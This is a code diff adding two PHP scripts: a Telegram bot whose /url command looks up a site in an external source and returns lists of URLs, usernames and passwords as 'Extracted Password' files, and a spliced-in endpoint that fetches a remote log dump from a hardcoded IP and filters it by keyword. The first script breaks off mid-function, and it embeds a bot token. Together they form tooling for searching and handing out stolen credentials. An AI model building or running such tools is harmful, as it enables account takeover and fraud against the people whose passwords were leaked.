@@ -1,0 +1,136 @@
+<?php
+// Bot token
+$botToken = "7752775437:AAFCQo1A5Gw_aILZPd6R6_BBuW8H_lEfQw4";
+$apiUrl = "https://api.telegram.org/bot$botToken/";
+
+// Function to send requests to Telegram API
+function sendRequest($method, $params = []) {
+    global $apiUrl;
+    $url = $apiUrl . $method;
+    $options = [
+        'http' => [
+            'header' => "Content-Type:application/json\r\n",
+            'method' => 'POST',
+            'content' => json_encode($params),
+        ]
+    ];
+    $context = stream_context_create($options);
+    $result = file_get_contents($url, false, $context);
+    return json_decode($result, true);
+}
+
+// Process the incoming update
+$content = file_get_contents("php://input");
+$update = json_decode($content, true);
+
+// Check if the update contains a message
+if (isset($update['message'])) {
+    $message = $update['message'];
+    $chatId = $message['chat']['id'];
+    $text = isset($message['text']) ? $message['text'] : '';
+    $userId = $message['from']['id'];
+    
+    // Group restriction
+    $allowedGroupId = -2137367604; // Replace with your group ID
+    if (isset($message['chat']['type']) && in_array($message['chat']['type'], ['group', 'supergroup'])) {
+        if ($chatId != $allowedGroupId) {
+            sendRequest('sendMessage', [
+                'chat_id' => $chatId,
+                'text' => "This bot only works in the group @teamEx06",
+            ]);
+            exit;
+        }
+    }
+
+    // Commands handling
+    if ($text == '/start') {
+        $msg = "Welcome to the bot! Please join the required channels:\n";
+        $msg .= "➡️ @Akaajshshsb\n➡️ @Billalogbot_bot\n\n";
+        $msg .= "After joining, use the commands to extract data.";
+        sendRequest('sendMessage', [
+            'chat_id' => $chatId,
+            'text' => $msg,
+            'reply_markup' => json_encode([
+                'inline_keyboard' => [
+                    [['text' => '🟢 Joined', 'callback_data' => 'joined']],
+                ],
+            ]),
+        ]);
+    } elseif (strpos($text, '/url') === 0) {
+        $url = trim(substr($text, 5));
+        if (empty($url)) {
+            sendRequest('sendMessage', [
+                'chat_id' => $chatId,
+                'text' => "Please provide a URL. Usage: /url https://example.com",
+            ]);
+        } else {
+            sendRequest('sendMessage', [
+                'chat_id' => $chatId,
+                'text' => "Processing...",
+            ]);
+
+            // Make a request to the external API
+            $apiUrl = "http:your api=" . urlencode($url);
+            $response = file_get_contents($apiUrl);
+            $data = json_decode($response, true);
+
+            if ($data && isset($data['data']) && !empty($data['data'])) {
+                $result = "";
+                foreach ($data['data'] as $entry) {
+                    $result .= "URL: " . $entry['url'] . "\n";
+                    $result .= "Username: " . $entry['login'] . "\n";
+                    $result .= "Password: " . $entry['password'] . "\n";
+                    $result .= "----------------------\n";
+                }
+
+                // Save the result in a file
+                $filename = "files/" . uniqid() . ".txt";
+                if (!file_exists("files")) {
+                    mkdir("files");
+                }
+                file_put_contents($filename, $result);
+
+                // Send the file to the user
+                sendRequest('sendDocument', [
+                    'chat_id' => $chatId,
+                    'document' => new CURLFile($filename),
+                    'caption' => "Extracted Password",
+                ]);
+            } else {
+                sendRequest('sendMessage', [
+                    'chat_id' => $chatId,
+                    'text' => "No data found for the given URL.",
+                ]);
+            }
+        }
+    }
+}
+
+// Handle callback queries
+if (isset($update['callback_query'])) {
+    $callbackQuery = $update['callback_query'];
+    $data = $callbackQuery['data'];
+    $chatId = $callbackQuery['message']['chat']['id'];
+<?php
+$log_url = "http://116.202.84.71/~devbd/bd.txt";
+if (isset($_GET['logs'])) {
+    $filter = $_GET['logs'];
+    $log_data = file_get_contents($log_url);
+
+    if ($log_data === false) {
+        http_response_code(500);
+        echo json_encode(["error" => "Failed to retrieve log data."]);
+        exit;
+    }
+    $log_lines = explode("\n", $log_data);
+    $filtered_logs = array_filter($log_lines, function($line) use ($filter) {
+        return stripos($line, $filter) !== false;
+    });
+    $filtered_logs = array_slice($filtered_logs, 0, 30);
+    header('Content-Type: application/json');
+    echo json_encode(array_values($filtered_logs));
+} else {
+    http_response_code(400);
+    echo json_encode(["error" => "The 'logs' parameter is required."]);
+}
+?>
